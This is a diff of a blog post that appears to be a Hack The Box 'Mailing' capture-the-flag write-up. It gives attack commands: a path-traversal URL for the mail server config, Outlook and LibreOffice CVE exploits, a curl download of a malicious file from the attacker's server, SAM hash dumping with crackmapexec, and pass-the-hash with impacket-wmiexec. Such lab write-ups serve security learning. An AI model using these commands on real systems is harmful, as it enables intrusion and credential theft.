@@ -1,7 +1,7 @@
 ---
 title: 'HTB Mailing Writeup'
 date: 2024-05-15
-permalink: /posts/2012/08/HTB-Mailing-Writeup/
+permalink: /posts/2024/05/HTB-Mailing-Writeup/
 tags:
   - HTB
   - writeup
@@ -44,7 +44,7 @@ Allright, so I think LFI (Local File Inclusion) is a possible entry point with t
 
 User flag
 ======
-After some more enumeration, I could download a hMailServer.INI file via the following URL: "http://mailing.htb/download.php?file=../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI"
+After some more enumeration, I could download a hMailServer.INI file via the following URL: [http://mailing.htb/download.php?file=../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI](http://mailing.htb/download.php?file=../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI)
 
 This file contains the administrator password of something > 
 
@@ -62,7 +62,7 @@ With the command `telnet 10.10.11.14 110` we can connect to the mailserver.
 
 There are no messages sadly. But the username and password are correct. 
 
-With the "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability" exploit a user and a password can be obtained. 
+With the [https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability) exploit a user and a password can be obtained. 
 
 Setup a responder listerner with: `sudo responder -I tun0 -v`
 
@@ -78,5 +78,46 @@ The user flag can be found in the Desktop directory >
 
 Root flag
 ======
-After searching the directories on the machine, we discovered that Libreoffice is running an outdated version. After searching for an exploit, we can use this tool: "https://github.com/elweth-sec/CVE-2023-2255" to probably gain root. 
+After searching the directories on the machine, we discovered that Libreoffice is running an outdated version. After searching for an exploit, we can use this tool: [https://github.com/elweth-sec/CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255) to probably gain root.
 
+<img src='/images/HTB_Mailing/Screenshot 2024-06-10 190939.png'>
+
+With this tool we can use the command: `python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'`.
+
+<img src='/images/HTB_Mailing/Screenshot 2024-06-10 191636.png'>
+
+We need to deliver this malicious file to the windows machine. This can be done with a python server and a curl command. > 
+
+In a new terminal window type: `python3 –m http.server 4444`
+
+<img src='/images/HTB_Mailing/Screenshot 2024-06-10 191756.png'>
+
+And in our Evil-WinRM: Go the the Important Documents dir (this is a root directory).
+
+And curl the exploit.odt file to the windows machine > `curl –o exploit.odt http://10.10.14.82:4444/exploit.odt`.
+
+<img src='/images/HTB_Mailing/Screenshot 2024-06-10 191901.png'>
+
+With the command `net users maya` we have a new admin local group now.
+
+<img src='/images/HTB_Mailing/Screenshot 2024-06-10 192039.png'>
+
+With the post exploitation tool crackmapexec, we can run this command > `crackmapexec smb 10.10.11.14 -u maya -p " <maya-admin-password> " --sam`.
+
+This way we can obtain the localadmin user’s hash. 
+
+<img src='/images/HTB_Mailing/Screenshot 2024-06-10 192929.png'>
+
+We don’t have to crack the hash if we use the impacket-wmiexec tool with the command: `impacket-wmiexec localadmin@10.10.11.14 -hashes "<hash-of-administrador>"`
+
+This gives us the root flag > 
+
+<img src='/images/HTB_Mailing/Screenshot 2024-06-10 193311.png'>
+
+Conclusion 
+======
+To pwn this machine took a lot more time than I thought. Again, searching for an entry point in the directories of the machine takes time because of the many dirs and files.  
+
+I hope you have learned something from this writeup. 
+
+Enjoy your day! 
